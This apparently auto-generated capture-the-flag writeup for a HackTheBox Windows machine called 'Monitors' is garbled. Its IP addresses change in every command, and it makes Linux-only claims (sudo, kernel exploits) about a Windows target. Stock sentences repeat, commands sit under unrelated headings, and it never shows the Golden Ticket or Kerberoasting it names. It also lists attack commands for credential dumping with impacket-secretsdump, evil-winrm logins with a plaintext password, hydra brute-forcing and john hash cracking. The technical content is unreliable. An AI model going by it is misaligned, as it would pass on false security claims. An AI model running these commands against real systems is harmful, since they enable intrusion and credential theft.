---
TitleSEO: "HackTheBox — Monitors (Easy Windows) | ZureFX"
TitlePost: "HackTheBox — Monitors (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Monitors. Golden Ticket and Kerberoasting to achieve easy compromise on Windows."
Keywords: "pwntilldawn, web, medium, easy, windows"
URL: "https://zurefx.github.io/writeups/htb-monitors-661.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-monitors-661/"
Date: "2025-03-15"
Tags: "PwnTillDawn, Web, Medium, Easy, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-monitors-661"
Permalink: "/writeups/htb-monitors-661.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Monitors** is rated **Easy** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.52.53.190`.

### Objectives

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.197.235
evil-winrm -i 10.46.75.100 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.29.193 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.212.17/FUZZ
evil-winrm -i 10.101.234.230 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

### Web Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **Golden Ticket**.

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.177.188
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.212.22 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.87.95.233 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.51.71.90/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
nmap -sCV -p53,135,993 10.128.148.207 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.235.241/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.231.118 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `netcat`
- `nmap`
- `psexec`
- `impacket`
- `ligolo-ng`
- `smbexec`
- `hydra`

### Key Takeaways

- Golden Ticket
- Kerberoasting
